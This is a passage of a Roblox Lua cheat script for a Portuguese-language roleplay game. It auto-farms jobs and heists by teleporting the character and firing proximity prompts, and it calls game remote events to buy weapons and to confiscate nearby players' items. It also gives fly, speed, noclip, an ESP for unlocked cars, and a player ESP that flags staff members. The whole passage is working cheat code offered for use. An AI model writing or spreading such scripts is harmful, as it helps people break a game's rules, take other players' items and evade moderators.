        end
        return closest
    end

    local function teleportAndActivate(cf)
        hrp.CFrame = cf
        task.wait(TP_DELAY)
        local prompt = getClosestPrompt(cf.Position)
        if prompt then
            fireproximityprompt(prompt)
        end
    end

    while active() do
        teleportAndActivate(CFrame.new(-1809.57849, 4.38730288, -1386.83716, 0.932450175, 0, -0.361298651, 0, 1, 0, 0.361298651, 0, 0.932450175))
        task.wait(5.9)
        if not active() then break end
        teleportAndActivate(CFrame.new(-1761.69946, 19.8842049, -1350.50757, 0, 0, 1, 0, 1, 0, -1, 0, 0))
        task.wait(1)
    end
end)


-- Repositor
createFarmToggle("Repositor", function(active)
    local pegarCFrame = CFrame.new(-1792.56726, 6.79736805, -555.22406)
    local entregarCFrame = CFrame.new(-1858.97229, 4.42555285, -571.29718)
    local function getClosestPrompt(pos)
        local closest, shortest = nil, math.huge
        for _, obj in ipairs(workspace:GetDescendants()) do
            local prompt = obj:FindFirstChildWhichIsA("ProximityPrompt")
            if prompt and obj:IsA("BasePart") then
                local ok, d = pcall(function() return (obj.Position - pos).Magnitude end)
                if ok and d < shortest then
                    closest, shortest = prompt, d
                end
            end
        end
        return closest
    end
    while active() do
        pcall(function() HRP.CFrame = pegarCFrame end)
        task.wait(0.2)
        local p = getClosestPrompt(pegarCFrame.Position)
        if p and active() then tryFirePrompt(p) end
        task.wait(5.5)
        if not active() then break end
        pcall(function() HRP.CFrame = entregarCFrame end)
        task.wait(0.2)
        p = getClosestPrompt(entregarCFrame.Position)
        if p and active() then tryFirePrompt(p) end
    end
end)

--  ROUBOS 

-- Armaz√©m

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local TP_DELAY = 0.3

local function getClosestPrompt(pos)
    local closest, shortest = nil, math.huge
    for _, prompt in ipairs(workspace:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") then
            local part = prompt.Parent
            if part and part:IsA("BasePart") then
                local d = (part.Position - pos).Magnitude
                if d < shortest then
                    closest, shortest = prompt, d
                end
            end
        end
    end
    return closest
end

local function teleportAndActivate(cf)
    hrp.CFrame = cf
    task.wait(TP_DELAY)
    local prompt = getClosestPrompt(cf.Position)
    if prompt then
        fireproximityprompt(prompt)
    end
end

local firstCFrame = CFrame.new(-2227.60791, 36.1245956, 6100.75, 0.999999881, 0, 0.000431610126, 0, 1, 0, -0.000431610126, 0, 0.999999881)

local cframes = {
    CFrame.new(-2246.59473, 35.5565262, 5975.0083, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-2202.95654, 35.7065353, 5939.24951, -1, 0, 0, 0, 1, 0, 0, 0, -1),
    CFrame.new(-2258.72729, 35.5062332, 5975.94043, 0, 0, -1, 0, 1, 0, 1, 0, 0),
    CFrame.new(-2237.93604, 43.2065201, 5974.15869, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-2290.28955, 38.6814346, 6144.9126, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2204.8064, 38.1814346, 5943.11914, -1, 0, 0, 0, 1, 0, 0, 0, -1),
    CFrame.new(-2268.37744, 38.1814346, 5974.27441, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2206.16797, 35.3565292, 5940.84961, -1, 0, 0, 0, 1, 0, 0, 0, -1),
    CFrame.new(-2271.54712, 35.7062302, 6028.92432, 0, 0, -1, 0, 1, 0, 1, 0, 0),
    CFrame.new(-2203.30615, 35.5565262, 6005.70752, -1, 0, 0, 0, 1, 0, 0, 0, -1),
    CFrame.new(-2290.99023, 35.5565262, 6079.87354, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2205.7063, 38.6814346, 6006.58789, -1, 0, 0, 0, 1, 0, 0, 0, -1),
    CFrame.new(-2249.89526, 35.5562363, 6030.70801, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-2218.13623, 35.7065353, 5974.15869, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-2206.0061, 38.1814346, 5997.01904, 0, 0, -1, 0, 1, 0, 1, 0, 0),
    CFrame.new(-2221.43628, 35.7062302, 6029.85938, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-2271.27783, 35.7065353, 6162.5542, -0.422592998, 0, -0.906319618, 0, 1, 0, 0.906319618, 0, -0.422592998),
    CFrame.new(-2290.28955, 38.6814346, 6067.11279, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2263.28809, 38.6814346, 6167.99023, -0.422592998, 0, -0.906319618, 0, 1, 0, 0.906319618, 0, -0.422592998),
    CFrame.new(-2290.99023, 43.0565262, 6137.87354, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2290.14014, 43.2065201, 6088.53223, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2241.23608, 35.7062302, 6029.85938, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-2221.43628, 43.2062302, 6029.85938, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-2204.50635, 38.6814346, 5948.78809, -1, 0, 0, 0, 1, 0, 0, 0, -1),
    CFrame.new(-2269.74658, 38.6814346, 6163.10303, -0.422592998, 0, -0.906319618, 0, 1, 0, 0.906319618, 0, -0.422592998),
    CFrame.new(-2290.14014, 43.2065353, 6166.33203, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2290.28955, 38.6814346, 6086.9126, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2290.14014, 35.7065353, 6146.53223, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2207.67188, 35.5065231, 6006.66943, -1, 0, 0, 0, 1, 0, 0, 0, -1),
    CFrame.new(-2249.89478, 43.0565262, 6030.7085, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    CFrame.new(-2290.99023, 43.0565262, 6060.07373, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2290.99023, 35.5565262, 6060.07373, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2290.99023, 35.5565262, 6137.87354, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    CFrame.new(-2206.47192, 35.5065231, 5948.86963, -1, 0, 0, 0, 1, 0, 0, 0, -1),
}

createFarmToggle("Armaz√©m", function(active)
    while active() do
        teleportAndActivate(firstCFrame)
        for _, cf in ipairs(cframes) do
            if not active() then break end
            teleportAndActivate(cf)
        end
        if not active() then break end
        hrp.CFrame = CFrame.new(-2124, 256, 6204)
        task.wait(1)
    end
end)



-- Banco

createFarmToggle("Banco", function(active)
    local hrp = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
    local TP_DELAY = 0.4

    local function safeFirePrompt(prompt)
        if prompt and prompt.Enabled then
            pcall(function() fireproximityprompt(prompt) end)
        end
    end

    local function getClosestPrompt(pos)
        local closest, shortest = nil, math.huge
        for _, prompt in ipairs(workspace:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") then
                local part = prompt.Parent
                if part and part:IsA("BasePart") then
                    local d = (part.Position - pos).Magnitude
                    if d < shortest then
                        closest, shortest = prompt, d
                    end
                end
            end
        end
        return closest
    end

    local function teleportAndActivate(cf, offset)
        hrp.CFrame = cf + (offset or Vector3.new())
        task.wait(TP_DELAY)
        safeFirePrompt(getClosestPrompt(cf.Position))
    end

    local args = {"comprarFuradeira"}
    game:GetService("ReplicatedStorage"):WaitForChild("xReplicatedStorage")
        :WaitForChild("Eventos"):WaitForChild("Loja"):FireServer(unpack(args))
    task.wait(1)

    while active() do
        local backpack = game.Players.LocalPlayer:WaitForChild("Backpack")
        local tool = backpack:FindFirstChild("Furadeira")
        if tool then tool.Parent = game.Players.LocalPlayer.Character end
        if not active() then break end

        local sequence1 = {
            CFrame.new(-1092.8175, 4.65136862, -974.123718, 0.984540522, 0, -0.17515704, 0, 1, 0, 0.17515704, 0, 0.984540522),
            CFrame.new(-1092.63647, 4.65136862, -1001.59589, 0.984540522, 0, -0.17515704, 0, 1, 0, 0.17515704, 0, 0.984540522),
            CFrame.new(-1092.53308, 4.65136862, -995.285583, 0.999998808, 0, -0.00155379577, 0, 1, 0, 0.00155379577, 0, 0.999998808),
            CFrame.new(-1146.18359, 4.70106649, -944.726196, 0, 0, -1, 0, 1, 0, 1, 0, 0),
            CFrame.new(-1092.74805, 4.65136862, -982.282043, 0.999998808, 0, -0.00155379577, 0, 1, 0, 0.00155379577, 0, 0.999998808),
        }

        for _, cf in ipairs(sequence1) do
            if not active() then break end
            teleportAndActivate(cf, Vector3.new(0,3,0))
        end
        if not active() then break end

        teleportAndActivate(CFrame.new(-1061.37, 5.38800049, -861.334045, 0, 0, 1, 0, 1, 0, -1, 0, 0), Vector3.new(0,3,0))
        task.wait(14)
        if not active() then break end

        local sequence2 = {
            CFrame.new(-1057.35876, 4.41856432, -840.422058),
            CFrame.new(-1055.44666, 2.83058095, -823.084534),
            CFrame.new(-1052.65137, 5.46029663, -822.591553),
            CFrame.new(-1065.67297, 5.46029568, -822.766541),
            CFrame.new(-1068.81152, 5.21029568, -822.83728),
            CFrame.new(-1068.6615, 2.83058167, -823.153015),
            CFrame.new(-1065.79272, 4.11856842, -840.321228),
            CFrame.new(-1047.70325, 4.29733419, -837.016846),
            CFrame.new(-1075.40601, 4.05597401, -837.353943),
            CFrame.new(-1047.70325, 4.29733419, -855.730835),
            CFrame.new(-1075.40601, 4.05597401, -850.353943),
            CFrame.new(-1075.40601, 4.05597401, -853.953918),
            CFrame.new(-1047.70325, 4.29733419, -833.216858),
            CFrame.new(-1047.70325, 4.29733419, -847.730835),
            CFrame.new(-1047.70325, 4.29733419, -851.930847),
            CFrame.new(-1075.40601, 4.05597401, -834.50824),
        }

        for _, cf in ipairs(sequence2) do
            if not active() then break end
            teleportAndActivate(cf, Vector3.new(0,3,0))
        end
        if not active() then break end

        teleportAndActivate(CFrame.new(-3038,53,-1134), Vector3.new(0,3,0))
        task.wait(5)
    end
end)


-- Cassino

createFarmToggle("Cassino", function(active)

    local args = {
        "Item",
        {
            "Ferramentas",
            "Bomba"
        }
    }
    game:GetService("ReplicatedStorage"):WaitForChild("xReplicatedStorage")
        :WaitForChild("Eventos"):WaitForChild("Loja"):FireServer(unpack(args))
wait(1)
   
    while active() do
        local backpack = LocalPlayer:WaitForChild("Backpack")
        local tool = backpack:FindFirstChild("Bomba")
        if tool then pcall(function() tool.Parent = Character end) end
        if not active() then break end

        local pasta = safeFind(workspace, "xWorkspace", "Sistemas", "Roubos", "Cassino", "Computadores")
        if pasta then
            for _, computador in ipairs(pasta:GetChildren()) do
                if not active() then break end
                local prompt = computador:FindFirstChildWhichIsA("ProximityPrompt", true)
                if prompt and prompt.Enabled then
                    local part = computador:IsA("BasePart") and computador or computador.PrimaryPart
                    if part then
                        pcall(function() HRP.CFrame = part.CFrame + Vector3.new(0,3,0) end)
                        task.wait(0.25)
                        tryFirePrompt(prompt)
                        task.wait(0.5)
                    end
                end
            end
        end
        if not active() then break end

        pcall(function() HRP.CFrame = CFrame.new(-2194, -99, 8) end)
        task.wait(0.5)
        local cofre = safeFind(workspace, "xWorkspace", "Sistemas", "Roubos", "Cassino", "Cofre")
        local prompt = cofre and cofre:FindFirstChildWhichIsA("ProximityPrompt", true)
        if prompt then tryFirePrompt(prompt) end
        task.wait(14)
        if not active() then break end

        local pasta2 = safeFind(workspace, "xWorkspace", "Sistemas", "Roubos", "Cassino", "Coleta")
        if pasta2 then
            for _, item in ipairs(pasta2:GetChildren()) do
                if not active() then break end
                local part = item:IsA("BasePart") and item or item.PrimaryPart
                pcall(function() HRP.CFrame = part.CFrame + Vector3.new(0,3,0) end)
                local prompt = item:FindFirstChildWhichIsA("ProximityPrompt", true)
                if prompt then tryFirePrompt(prompt) end
                task.wait(0.25)
            end
        end

        pcall(function() HRP.CFrame = CFrame.new(-3038,53,-1134) end)
        task.wait(3)
        local entrega = safeFind(workspace, "xWorkspace", "Sistemas", "Roubos", "Entrega")
        entrega = entrega and entrega:GetChildren()[2]
        if entrega then
            local prompt = entrega:FindFirstChildWhichIsA("ProximityPrompt", true)
            if prompt then tryFirePrompt(prompt) end
        end
        task.wait(5)
    end
end)

--  TELEPORTS 
local function TP(x,y,z)
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        pcall(function()
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
        end)
    end
end

Teleports:Button({ Title = "Prefeitura", Callback = function() TP(-2050, 8, -905) end })
Teleports:Button({ Title = "Loja de Carros", Callback = function() TP(-1845, 4, -1174) end })
Teleports:Button({ Title = "Loja de Itens", Callback = function() TP(-1211, 4, -383) end })
Teleports:Button({ Title = "Loja de Acess√≥rios", Callback = function() TP(-1243, 4, -383) end })
Teleports:Button({ Title = "Bradesco", Callback = function() TP(-1396, 4, -396) end })
Teleports:Button({ Title = "Joalheria", Callback = function() TP(-1840, 4, -390) end })
Teleports:Button({ Title = "Banco", Callback = function() TP(-1123, 4, -986) end })
Teleports:Button({ Title = "Cassino", Callback = function() TP(-2244, 3, -21) end })
Teleports:Button({ Title = "Desmanche", Callback = function() TP(-2771, 4, -751) end })
Teleports:Button({ Title = "Limpar Dinheiro", Callback = function() TP(-2808, 35, -1133) end })
Teleports:Button({ Title = "Armaz√©m", Callback = function() TP(-2224, 36, 6101) end })
Teleports:Button({ Title = "Alpha Vile", Callback = function() TP(-4897, 36, 4147) end })
Teleports:Button({ Title = "Pra√ßa", Callback = function() TP(-1674, 4, -894) end })
Teleports:Button({ Title = "Garagem", Callback = function() TP(-1745, 4, -885) end })

--  LOJA 
Loja:Dropdown({
    Title = "Comprar arma",
    Values = { "G18-M","FAMAS","Scar","Draco","MP7","AK47","Faca","TEC9","FAL-M","Thompson","AK47-URSO","AR15-M","Revolver","M4A1","AWM","Mac-10","SPAS-12","Desert Eagle","G17","P90","Shorty","AR15","Machado","M9 Barreta","AA-12","G18","M4","FAL","AK47-M","UMP45" },
    Callback = function(item)
        local args = { "Item", { "Ilegal", item } }
        pcall(function()
            local evt = ReplicatedStorage:FindFirstChild("xReplicatedStorage") and ReplicatedStorage.xReplicatedStorage:FindFirstChild("Eventos")
            if evt and evt:FindFirstChild("Loja") then
                evt.Loja:FireServer(unpack(args))
            end
        end)
    end
})

Loja:Dropdown({
    Title = "Ferramentas",
    Values = { "Vara de pesca","Barricada","Maleta Mec√¢nico","Furadeira","Lockpick","Faca","Martelo" },
    Callback = function(item)
        local args = { "Item", { "Ferramentas", item } }
        pcall(function()
            local evt = ReplicatedStorage:FindFirstChild("xReplicatedStorage") and ReplicatedStorage.xReplicatedStorage:FindFirstChild("Eventos")
            if evt and evt:FindFirstChild("Loja") then
                evt.Loja:FireServer(unpack(args))
            end
        end)
    end
})

--Empregos
 
Misc:Dropdown({
    Title = "Empregos",
    Values = { "Pedreiro", "Repositor", "Fazendeiro", "Pizzaiolo", "Ifood", "Cargas", "Samu" },
    Callback = function(job)
        pcall(function()
            local args = {
                job
            }
            game:GetService("ReplicatedStorage")
                :WaitForChild("xReplicatedStorage")
                :WaitForChild("Eventos")
                :WaitForChild("Emprego")
                :InvokeServer(unpack(args))
        end)
    end
})


--Esp Carro

local carESP_Connections = {}
local carESP_ChildConnection = nil
local carESP_Enabled = false

local function createCarHighlight(obj)
    if not obj or not obj:IsA("Model") and not obj:IsA("BasePart") then return end
    if obj:FindFirstChild("CarESP") then return end
    local success, h = pcall(function()
        local highlight = Instance.new("Highlight")
        highlight.Name = "CarESP"
        highlight.Adornee = obj
        highlight.FillColor = Color3.fromRGB(0, 255, 0)
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Parent = game:GetService("CoreGui") 
        return highlight
    end)
    if not success then
        pcall(function()
            local highlight = Instance.new("Highlight")
            highlight.Name = "CarESP"
            highlight.Adornee = obj
            highlight.FillColor = Color3.fromRGB(0, 255, 0)
            highlight.FillTransparency = 0.5
            highlight.OutlineTransparency = 0
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlight.Parent = obj
        end)
    end
end

local function removeCarHighlight(obj)
    if not obj then return end
    local h = nil
    for _, c in ipairs(game:GetService("CoreGui"):GetChildren()) do
        if c.Name == "Highlight" or c.Name == "CarESP" then
            if pcall(function() return c.Adornee == obj end) then
                if c.Adornee == obj then
                    pcall(function() c:Destroy() end)
                end
            end
        end
    end
    local localh = obj:FindFirstChild("CarESP")
    if localh then pcall(function() localh:Destroy() end) end
end

local function scanAndBindCars()
    for _, con in ipairs(carESP_Connections) do
        pcall(function() con:Disconnect() end)
    end
    carESP_Connections = {}

    local carrosFolder = safeFind(workspace, "xWorkspace", "Sistemas", "Conce", "Carros")
    if not carrosFolder then return end

    for _, carro in ipairs(carrosFolder:GetChildren()) do
        pcall(function()
            local valores = carro:FindFirstChild("Valores")
            if valores then
                local trancado = valores:FindFirstChild("Trancado")
                if trancado and trancado:IsA("BoolValue") then
                    if not trancado.Value then
                        createCarHighlight(carro)
                    else
                        removeCarHighlight(carro)
                    end

                    local con = trancado.Changed:Connect(function(v)
                        if not v then
                            createCarHighlight(carro)
                        else
                            removeCarHighlight(carro)
                        end
                    end)
                    table.insert(carESP_Connections, con)
                end
            end
        end)
    end

    if carESP_ChildConnection then
        pcall(function() carESP_ChildConnection:Disconnect() end)
        carESP_ChildConnection = nil
    end
    carESP_ChildConnection = carrosFolder.ChildAdded:Connect(function(newChild)
        task.wait(0.1)
        scanAndBindCars()
    end)
end

local function enableCarESP()
    if carESP_Enabled then return end
    carESP_Enabled = true
    scanAndBindCars()
end

local function disableCarESP()
    carESP_Enabled = false
    local carrosFolder = safeFind(workspace, "xWorkspace", "Sistemas", "Conce", "Carros")
    if carrosFolder then
        for _, carro in ipairs(carrosFolder:GetChildren()) do
            pcall(function() removeCarHighlight(carro) end)
        end
    end
    for _, con in ipairs(carESP_Connections) do
        pcall(function() con:Disconnect() end)
    end
    carESP_Connections = {}
    if carESP_ChildConnection then pcall(function() carESP_ChildConnection:Disconnect() end) end
    carESP_ChildConnection = nil
end


Esp:Toggle({
    Title = "ESP carros destrancados",
    Desc = "",
    Value = false,
    Callback = function(state)
        if state then
            pcall(enableCarESP)
        else
            pcall(disableCarESP)
        end
    end
})

--fly
    
local flySpeed = 50
local flying = false
local keys = { W=false, A=false, S=false, D=false, Space=false, LeftControl=false }


UserInputService.InputBegan:Connect(function(i,gp)
    if gp then return end
    local kc = i.KeyCode and i.KeyCode.Name
    if kc and keys[kc] ~= nil then keys[kc] = true end
end)

UserInputService.InputEnded:Connect(function(i)
    local kc = i.KeyCode and i.KeyCode.Name
    if kc and keys[kc] ~= nil then keys[kc] = false end
end)


RunService.RenderStepped:Connect(function(dt)
    if flying and HRP then
        local moveDir = Vector3.new(0,0,0)


        local dir = Vector3.new(
            (keys.D and 1 or 0) - (keys.A and 1 or 0),
            (keys.Space and 1 or 0) - (keys.LeftControl and 1 or 0),
            (keys.S and 1 or 0) - (keys.W and 1 or 0)
        )
        if dir.Magnitude > 0 then
            moveDir = moveDir + dir.Unit
        end


        local humanoid = HRP.Parent:FindFirstChild("Humanoid")
        if humanoid then
            local md = humanoid.MoveDirection
            moveDir = moveDir + Vector3.new(md.X, 0, md.Z)
        end


        if moveDir.Magnitude > 0 then
            moveDir = moveDir.Unit
            local move = (Camera.CFrame:VectorToWorldSpace(Vector3.new(moveDir.X,0,moveDir.Z)) + Vector3.new(0, moveDir.Y, 0)) * flySpeed * dt
            pcall(function() HRP.CFrame = HRP.CFrame + move end)
        end
    end
end)


PlayerTab:Toggle({
    Title="Fly",
    Type="Checkbox",
    Value=false,
    Callback=function(s)
        flying = s
        pcall(function()
            if HRP then HRP.Anchored = s end
        end)
    end
})

--slider dp fly

PlayerTab:Slider({
    Title = "Velocidade do Fly",
    Desc = "",
    Step = 10,
    Value = {Min = 50, Max = 500, Default = flySpeed},
    Callback = function(value)
        flySpeed = value
    end
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")
local Camera = workspace.CurrentCamera

local speed = 40 
local walking = false
local keys = { W=false, A=false, S=false, D=false }


LocalPlayer.CharacterAdded:Connect(function(char)
    Character = char
    HRP = Character:WaitForChild("HumanoidRootPart")
end)


UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if keys[input.KeyCode.Name] ~= nil then keys[input.KeyCode.Name] = true end
end)
UserInputService.InputEnded:Connect(function(input)
    if keys[input.KeyCode.Name] ~= nil then keys[input.KeyCode.Name] = false end
end)


RunService.RenderStepped:Connect(function(dt)
    if walking and HRP then
        local dir = Vector3.new(
            (keys.D and 1 or 0) - (keys.A and 1 or 0),
            0,
            (keys.S and 1 or 0) - (keys.W and 1 or 0)
        )
        if dir.Magnitude > 0 then
            dir = dir.Unit
            local move = Camera.CFrame:VectorToWorldSpace(Vector3.new(dir.X,0,dir.Z)) * speed * dt
            HRP.CFrame = HRP.CFrame + Vector3.new(move.X, 0, move.Z)
        end
    end
end)


PlayerTab:Toggle({
    Title = "Speed",
    Value = walking,
    Callback = function(state)
        walking = state
    end
})

PlayerTab:Slider({
    Title = "Velocidade do Speed",
    Desc = "",
    Step = 5,
    Value = { Min = 10, Max = 200, Default = speed },
    Callback = function(value)
        speed = value
    end
})

local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local noclipConn

PlayerTab:Toggle({
    Title = "Noclip",
    Value = false,
    Callback = function(state)
        if state then
            noclipConn = RunService.Stepped:Connect(function()
                local char = player.Character
                if char then
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
        else
            if noclipConn then
                noclipConn:Disconnect()
                noclipConn = nil
            end

            local char = player.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            end
        end
    end
})


local ProximityPromptService = game:GetService("ProximityPromptService")
local PromptButtonHoldBegan = nil

local Toggle = Misc:Toggle({
    Title = "InstantPrompt",
    Desc = "",
    Icon = "bird",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if state then
            PromptButtonHoldBegan = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
                fireproximityprompt(prompt)
            end)
        else
            if PromptButtonHoldBegan then
                PromptButtonHoldBegan:Disconnect()
                PromptButtonHoldBegan = nil
            end
        end
    end
})

--Auto Revistar

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

local revisarEvent
local success, result = pcall(function()
    return ReplicatedStorage:WaitForChild("xReplicatedStorage")
        :WaitForChild("Eventos")
        :WaitForChild("revisar_function")
end)
if success then
    revisarEvent = result
end

local function enviarMensagem(msg)
    pcall(function()
        if TextChatService.TextChannels.RBXGeneral then
            TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
        end
    end)
end

local function getNearestPlayer(maxDist)
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local root = char.HumanoidRootPart
    local nearest, distMin
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (root.Position - plr.Character.HumanoidRootPart.Position).Magnitude
            if dist < (distMin or maxDist) then
                nearest = plr
                distMin = dist
            end
        end
    end
    return nearest
end

local function ConfiscarItens(player)
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return end
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local nome = item.Name
            if nome:lower() ~= "celular" then
                pcall(function()
                    if revisarEvent then
                        revisarEvent:InvokeServer("confiscar", nome)
                    end
                end)
            end
        end
    end
end

local ScreenGui, Button
local ButtonVisible = false
local connections = {}

local function disconnectAll()
    for _, conn in pairs(connections) do
        if conn then
            conn:Disconnect()
        end
    end
    connections = {}
end

local function makeDraggable(frame)
    disconnectAll()
    local dragging = false
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                   startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    connections.inputBegan = frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    connections.inputChanged = frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    connections.renderStepped = RunService.RenderStepped:Connect(function()
        if dragging and dragInput then
            update(dragInput)
        end
    end)
end

local function criarRevistarUI()
    if ScreenGui then
        ButtonVisible = not ButtonVisible
        Button.Visible = ButtonVisible
        return
    end

    ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.Name = "RevistarUI"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = false

    Button = Instance.new("TextButton", ScreenGui)
    Button.Size = UDim2.new(0, 120, 0, 40)
    Button.Position = UDim2.new(0.82, 0, 0.5, 0)
    Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Button.TextColor3 = Color3.new(1, 1, 1)
    Button.TextScaled = true
    Button.Text = "Revistar"
    ButtonVisible = true

    local corner = Instance.new("UICorner", Button)
    corner.CornerRadius = UDim.new(0, 10)

    Button.MouseButton1Click:Connect(function()
        local target = getNearestPlayer(10)
        if not target then return end
        enviarMensagem("/revistar " .. target.Name)
        task.wait(0.5)
        ConfiscarItens(target)
    end)

    makeDraggable(Button)
    
    connections.characterAdded = LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.5)
        if Button and ScreenGui then
            makeDraggable(Button)
        end
    end)
end

if ScreenGui then
    ScreenGui.Destroying:Connect(function()
        disconnectAll()
    end)
end

Misc:Button({
    Title = "Auto Revistar",
    Desc = "",
    Locked = false,
    Callback = function()
        criarRevistarUI()
    end,
})

--esp

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

local STAFF_GROUP_ID = 35641771
local STAFF_MIN_RANK = 5

local MaxDistance = 70
local function SetMaxDistance(value) MaxDistance = value end

local ESP = {
    Box = false,
    Name = false,
    Health = false,
    Skeleton = false,
    Items = false,
    Team = false,
    Staff = false,
    InvisibleCheck = true
}

local Objects = {}

local function TeamColor(player)
    if player.Team and player.Team.TeamColor then
        return player.Team.TeamColor.Color
    end
    return Color3.fromRGB(255,255,255)
end

local function NewLine()
    local l = Drawing.new("Line")
    l.Visible = false
    l.Transparency = 1
    l.Thickness = 1
    return l
end

local function NewText(size, center)
    local t = Drawing.new("Text")
    t.Size = size
    t.Center = center
    t.Outline = true
    t.Visible = false
    t.Transparency = 1
    return t
end

local function NewBox()
    local b = Drawing.new("Square")
    b.Filled = false
    b.Visible = false
    b.Transparency = 1
    b.Thickness = 1.5
    return b
end

local function ClearPlayer(player)
    if Objects[player] then
        for _, obj in pairs(Objects[player]) do
            if typeof(obj) == "table" then
                for _, d in pairs(obj) do 
                    pcall(function() d:Remove() end)
                end
            else
                pcall(function() obj:Remove() end)
            end
        end
        Objects[player] = nil
    end
end

local function IsStaff(player)
    local success, rank = pcall(function()
        return player:GetRankInGroup(STAFF_GROUP_ID)
    end)
    return success and rank >= STAFF_MIN_RANK
end

local function GetParts(char)
    return {
        Head = char:FindFirstChild("Head"),
        UpperTorso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso"),
        LeftArm = char:FindFirstChild("LeftUpperArm") or char:FindFirstChild("Left Arm"),
        RightArm = char:FindFirstChild("RightUpperArm") or char:FindFirstChild("Right Arm"),
        LeftLeg = char:FindFirstChild("LeftUpperLeg") or char:FindFirstChild("Left Leg"),
        RightLeg = char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg")
    }
end

local function GetItems(player)
    local items = {}
    local bp = player:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") then table.insert(items, t.Name) end
        end
    end
    local char = player.Character
    if char then
        for _, t in ipairs(char:GetChildren()) do
            if t:IsA("Tool") then table.insert(items, t.Name) end
        end
    end
    return table.concat(items, ", ")
end

local function IsInvisible(player)
    local char = player.Character
    if not char then return true end
    
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            if part.Transparency < 1 then
                return false
            end
        end
    end
    
    return true
end

local function HideAll(esp)
    for _, v in pairs(esp) do
        if typeof(v) == "table" then
            for _, d in pairs(v) do d.Visible = false end
        else
            v.Visible = false
        end
    end
end

local function SetupPlayer(player)
    if player == LocalPlayer then return end
    Objects[player] = {
        Box = NewBox(),
        Name = NewText(10,true),
        Health = NewText(12,false),
        Team = NewText(13,false),
        Items = NewText(13,false),
        Skeleton = {
            Head = NewLine(),
            LA = NewLine(),
            RA = NewLine(),
            LL = NewLine(),
            RL = NewLine()
        },
        StaffText = NewText(14,true)
    }
end

for _, p in ipairs(Players:GetPlayers()) do SetupPlayer(p) end
